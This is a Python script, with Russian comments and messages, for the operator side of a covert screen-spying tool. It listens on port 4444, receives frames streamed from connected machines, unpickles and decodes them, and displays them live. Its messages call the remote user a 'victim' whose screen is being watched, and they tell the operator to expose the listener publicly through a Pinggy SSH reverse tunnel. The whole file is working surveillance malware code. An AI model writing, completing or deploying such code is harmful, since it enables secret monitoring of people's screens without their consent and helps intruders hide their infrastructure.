import socket
import cv2
import pickle
import struct
import threading

HOST = '0.0.0.0'
PORT = 4444

def handle_client(conn, addr):
    print(f"[+] Жертва {addr} подключилась — смотрим её экран в реальном времени")
    
    data = b""
    payload_size = struct.calcsize(">L")
    window_name = f"Live Screen — {addr[0]}"

    try:
        while True:
            # Получаем размер пакета
            while len(data) < payload_size:
                packet = conn.recv(4096)
                if not packet:
                    raise ConnectionResetError
                data += packet

            packed_msg_size = data[:payload_size]
            data = data[payload_size:]
            msg_size = struct.unpack(">L", packed_msg_size)[0]

            # Получаем сам кадр
            while len(data) < msg_size:
                data += conn.recv(4096)

            frame_data = data[:msg_size]
            data = data[msg_size:]

            # Декодируем
            frame = pickle.loads(frame_data)
            frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)

            if frame is not None:
                cv2.imshow(window_name, frame)

            # Выход по кнопке q
            if cv2.waitKey(1) & 0xFF == ord('q'):
                print("[-] Ты нажал q — закрываем просмотр")
                break

    except Exception as e:
        print(f"[-] Соединение с {addr} разъебалось: {e}")
    finally:
        conn.close()
        cv2.destroyWindow(window_name)

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)

    print(f"[+] Сервер запущен на порту {PORT}")
    print("[+] Запусти Pinggy командой: ssh -p 443 -R0:localhost:4444 a.pinggy.io")
    print("[+] Жди, когда жертва подключится по live...\n")

    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
        thread.start()

if __name__ == "__main__":
    start_server()
